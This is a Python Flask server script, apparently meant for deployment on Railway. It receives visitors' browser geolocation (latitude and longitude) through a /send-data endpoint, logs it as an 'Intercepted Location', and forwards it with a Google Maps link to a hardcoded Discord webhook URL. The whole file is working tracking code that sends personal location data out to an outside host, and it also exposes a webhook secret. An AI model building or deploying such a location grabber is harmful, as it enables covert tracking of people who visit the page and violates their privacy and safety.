import os
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# ---------------------------------------------------------
# PASTE YOUR DISCORD WEBHOOK URL BETWEEN THE QUOTES BELOW:
# ---------------------------------------------------------
WEBHOOK_URL = "https://discord.com/api/webhooks/1530803914130194592/El2eCKZqFs4Cq__hpaTwMOY3I5ZJFXAiKSZjz7C-KWIMLDlep7TvvTl6LQmnn_T1L1Cd"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/send-data', methods=['POST'])
def handle_incoming_data():
    try:
        browser_data = request.get_json()
        
        if not browser_data:
            return jsonify({"status": "error", "message": "No data received"}), 400

        latitude = browser_data.get('latitude')
        longitude = browser_data.get('longitude')
        
        print(f"[SERVER LOG] Intercepted Location: Lat {latitude}, Lon {longitude}")

        # Corrected layout formatting for the clickable Discord Markdown link
        webhook_payload = {
            "embeds": [
                {
                    "title": "🌐 New Localhost Access Event",
                    "color": 5763719,
                    "fields": [
                        {"name": "Latitude", "value": f"`{latitude}`", "inline": True},
                        {"name": "Longitude", "value": f"`{longitude}`", "inline": True},
                        {"name": "Maps Link", "value": f"[👉 Click Here to Open Google Maps](https://google.com/maps/place/{latitude},{longitude})", "inline": False}
                    ]
                }
            ]
        }

        response = requests.post(WEBHOOK_URL, json=webhook_payload)
        
        if response.status_code in [200, 204]:
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error", "message": "Webhook rejected"}), 500

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    # Instructs Flask to read the port assigned by Railway dynamically
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
